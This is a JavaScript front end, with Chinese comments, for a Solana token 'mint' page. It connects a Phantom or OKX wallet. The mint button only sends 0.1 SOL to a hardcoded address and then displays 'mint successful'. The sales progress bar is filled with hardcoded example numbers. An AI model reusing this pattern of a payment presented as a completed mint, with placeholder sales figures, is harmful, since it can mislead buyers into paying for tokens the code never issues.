// 解决 Buffer 未定义的问题
import { Buffer } from "https://esm.sh/buffer";
window.Buffer = Buffer;

const connectWalletButton = document.getElementById('connectWallet');
const mintButton = document.getElementById('mintButton');
const amountInput = document.getElementById('amount');
const statusDisplay = document.getElementById('status');

let payer;
let connection;

// 检测钱包是否安装
function isWalletInstalled() {
  return window.solana || window.okxwallet;
}

// 获取 Solana 对象
function getSolana() {
  if (window.okxwallet) {
    return window.okxwallet.solana;
  } else if (window.solana) {
    return window.solana;
  }
  return null;
}

// 如果未安装钱包则禁用连接钱包按钮
if (!isWalletInstalled()) {
  connectWalletButton.disabled = true;
  statusDisplay.textContent = "未检测到钱包，请安装 Phantom 钱包 或 OKX 钱包!";
}

// 连接钱包
async function connectWallet() {
  try {
    const solana = getSolana();
    if (!solana) {
      statusDisplay.textContent = "未检测到钱包，请安装 Phantom 钱包 或 OKX 钱包!";
      return;
    }

    // 连接钱包
    await solana.connect();
    payer = { publicKey: solana.publicKey };

    // 创建连接，使用免费的 Solana 官方 RPC
    connection = new solanaWeb3.Connection("https://api.mainnet-beta.solana.com", 'confirmed');

    statusDisplay.textContent = `已连接钱包: ${payer.publicKey.toBase58()}`;
    connectWalletButton.textContent = '断开钱包';
    mintButton.disabled = false;
    connectWalletButton.removeEventListener('click', connectWallet);
    connectWalletButton.addEventListener('click', disconnectWallet);

  } catch (error) {
    console.error("Connection failed:", error);
    statusDisplay.textContent = "连接钱包失败. 请检查 Solana 是否已安装并正确配置.";
  }
}

// 断开钱包
async function disconnectWallet() {
  const solana = getSolana();
  if (solana) {
    await solana.disconnect();
  }

  payer = null;
  connection = null;

  statusDisplay.textContent = "钱包已断开.";
  connectWalletButton.textContent = '连接钱包';
  mintButton.disabled = true;
  connectWalletButton.removeEventListener('click', disconnectWallet);
  connectWalletButton.addEventListener('click', connectWallet);
}

// 连接钱包按钮点击事件
connectWalletButton.addEventListener('click', connectWallet);

// 铸造按钮点击事件
mintButton.addEventListener('click', async () => {
  const amount = parseInt(amountInput.value);
  const recipientPublicKey = '2wdjheNt1g6RHQqt4mm12oNt6PX4w53S1ivry31Gm6PD'; // 替换为实际的接收地址
  const mintAmount = 10000;

  if (isNaN(amount) || amount !== 1) {
    statusDisplay.textContent = "铸造数量无效. 单次只能铸造一份.";
    return;
  }

  if (!payer) {
    statusDisplay.textContent = "请先连接钱包.";
    return;
  }

  try {
    statusDisplay.textContent = "铸造中...请等待.";

    // 转账 0.1 SOL
    const lamports = 0.1 * solanaWeb3.LAMPORTS_PER_SOL;
    const transaction = new solanaWeb3.Transaction().add(
      solanaWeb3.SystemProgram.transfer({
        fromPubkey: payer.publicKey,
        toPubkey: new solanaWeb3.PublicKey(recipientPublicKey),
        lamports: lamports,
      })
    );

    // 获取最新区块哈希
    const { blockhash } = await connection.getLatestBlockhash();
    transaction.recentBlockhash = blockhash;

    // 设置交易费用支付者
    transaction.feePayer = payer.publicKey;

    // 签署交易
    const solana = getSolana();
    if (!solana) {
      statusDisplay.textContent = "未检测到钱包，请安装 Phantom 钱包 或 OKX 钱包!";
      return;
    }

    const signedTransaction = await solana.signTransaction(transaction);
    const serializedTransaction = new Uint8Array(signedTransaction.serialize());

    // 发送交易
    const signature = await connection.sendRawTransaction(serializedTransaction);

    // 确认交易
    await connection.confirmTransaction(signature, 'confirmed');

    console.log('Transaction completed:', signature);
    statusDisplay.textContent = `铸造成功! 交易ID: ${signature}`;

  } catch (error) {
    console.error("Minting failed:", error);
    statusDisplay.textContent = `铸造失败: ${error.message}`;
  }
});

// 更新铸造进度条
function updateSalesProgress(currentSales, totalSupply) {
  const percentage = (currentSales / totalSupply) * 100;
  const progressBar = document.getElementById('salesProgressBar');
  const salesPercentageDisplay = document.getElementById('salesPercentage');

  progressBar.style.width = `${percentage}%`;
  salesPercentageDisplay.textContent = `${percentage.toFixed(2)}%`;
}

// 示例用法 (用实际数据替换)
const totalSupply = 21000000;
let currentSales = 10500000;

updateSalesProgress(currentSales, totalSupply);
